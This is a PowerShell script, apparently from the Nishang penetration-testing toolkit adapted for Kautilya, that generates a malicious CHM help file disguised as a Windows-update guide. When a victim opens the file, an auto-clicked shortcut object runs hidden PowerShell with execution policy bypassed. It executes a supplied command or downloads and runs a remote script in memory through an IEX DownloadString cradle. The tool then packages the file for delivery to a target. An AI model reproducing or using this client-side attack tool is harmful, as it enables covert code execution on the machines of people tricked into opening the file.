
function Out-CHM
{

<#
.SYNOPSIS
Nishang script modified for Kautilya, useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.

.DESCRIPTION
The script generates a CHM file which needs to be sent to a target.
You must have hhc.exe (HTML Help Workshop) on your machine to use this script.
HTML Help Workshop is a free Microsoft Tool and could be downloaded from below link:
http://www.microsoft.com/en-us/download/details.aspx?id=21138

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.EXAMPLE
PS > Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Above command would execute Get-Process on the target machine when the CHM file is opened.

.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which executes the encoded command/script.
Use Invoke-Encode from Nishang to encode the command or script.

.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to pass an argument to the powershell script/module.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang

.Notes
Based on the work mentioned in this tweet by @ithurricanept
https://twitter.com/ithurricanept/status/534993743196090368
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $HHCPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath="$pwd"
    )

    #Check if the payload has been provided by the user
    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    

    #Create the table of contents for the CHM
    $CHMTableOfContents = @"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced IP Settings Tab">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>
"@

    #Create the Project file for the CHM
    $CHMProject = @"
[OPTIONS]
Contents file=$OutputPath\doc.hhc
[FILES]
$OutputPath\doc.htm
"@
    #Create the HTM files, the first one controls the payload execution.
    $CHMHTML1 = @"
<HTML>
<TITLE>Check for Windows updates from Command Line</TITLE>
<HEAD>
</HEAD>
<BODY>

<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile $Payload">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>


</BODY>
</HTML>
"@


    #Write all files to disk for compilation
    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
    
    #Compile the CHM, only this needs to be sent to a target.
    $HHC = "$HHCPath" + "\hhc.exe"
    & "$HHC" "$OutputPath\doc.hhp"

    #Cleanup
    Remove-Item "$OutputPath\doc.hhc"
    Remove-Item "$OutputPath\doc.htm"
    Remove-Item "$OutputPath\doc.hhp"

    #Create a zip archive of the CHM file
    $SourceFile = "$OutputPath\doc.chm"
    $ZipFile = "$OutputPath\doc.zip"
    #http://stackoverflow.com/questions/11021879/creating-a-zipped-compressed-folder-in-windows-using-powershell-or-the-command-l	
    if(-not (test-path($ZipFile)))
    {
	    Set-Content $ZipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))		
    }
	
    $shellApplication = new-object -com shell.application
    $zippackage = $shellApplication.NameSpace($ZipFile)
    $zippackage.copyhere($SourceFile)
    
    #Wait till zip archive is written to the disk
    Start-Sleep -Seconds 3

    #Read the zip archive in bytes and write to a file
    #Use this txt file in Kautilya with the Drop CHM file payload.
    [byte[]] $FileContent = Get-Content -Encoding Byte $ZipFile
    [System.IO.File]::WriteAllLines("$OutputPath\encodedchm.txt", $FileContent)

    #Cleanup
    Remove-Item $SourceFile
    Remove-Item $ZipFile
    
}